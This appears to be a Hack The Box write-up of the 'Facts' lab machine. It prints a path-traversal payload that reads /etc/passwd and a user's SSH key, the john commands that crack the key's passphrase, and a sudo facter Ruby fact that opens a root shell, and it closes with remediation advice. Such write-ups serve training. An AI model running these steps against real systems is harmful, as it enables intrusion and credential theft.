Hack The Box — Linux Easy

Facts Writeup

Author: Atrox | Tags: Path Traversal, LFI, SSH Key Cracking, Facter, Privilege Escalation

1. Introduction

Facts is an Easy-rated Linux machine on HackTheBox. It presents a realistic attack chain covering authenticated LFI, credential recovery via SSH key cracking, and privilege escalation through the abuse of Facter custom facts.

2. Reconnaissance

2.1 Port Scanning

nmap -sV 10.129.20.114
PortServiceVersion
22/tcpSSHOpenSSH 9.9p1
80/tcpHTTPnginx 1.26.3

3. Web Application Enumeration

The application at facts.htb contains an admin panel. Enumeration revealed a suspicious endpoint used for file downloads:

http://facts.htb/admin/media/download_private_file?file=<filename>

4. Exploitation — Path Traversal / LFI

4.1 Confirming the Vulnerability

By injecting traversal sequences, we can bypass the intended directory. Testing with /etc/passwd:

http://facts.htb/admin/media/download_private_file?file=../../../../../etc/passwd

The server returns the file content, identifying two primary users: trivia (UID 1000) and william (UID 1001).

4.2 Retrieving Flags and Keys

  • User Flag: Located at /home/william/user.txt.
  • SSH Key: Found at /home/trivia/.ssh/id_ed25519.

The SSH key is encrypted with AES-256-CTR and protected by a passphrase.

5. Initial Access — SSH as trivia

5.1 Cracking the Passphrase

We use ssh2john to prepare the hash and john with rockyou.txt:

ssh2john trivia_key > trivia_hash
john --wordlist=/usr/share/wordlists/rockyou.txt trivia_hash

Passphrase found: dragonballz

5.2 SSH Login

ssh trivia@10.129.20.114 -i trivia_key

6. Privilege Escalation — Facter Abuse

6.1 Sudo Privileges

trivia@facts:~$ sudo -l
...
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter

6.2 Exploiting --custom-dir

Facter allows loading custom Ruby scripts via the --custom-dir flag. Since we can run it as root, we can execute arbitrary Ruby code.

Step 1: Create a malicious Ruby fact:

mkdir -p /tmp/pwn
cat > /tmp/pwn/shell.rb << 'EOF'
Facter.add('shell') do
  setcode do
    system('/bin/bash')
    "done"
  end
end
EOF

Step 2: Execute with sudo:

sudo /usr/bin/facter --custom-dir /tmp/pwn shell

This spawns a shell as root.

8. Remediation Recommendations

  • Sanitize Input: Use an allowlist for filenames or canonicalize paths before reading files.
  • File Permissions: Ensure sensitive directories like .ssh are not readable by the web service user.
  • Restrict Sudo: Avoid NOPASSWD for binaries that allow loading external scripts or code.
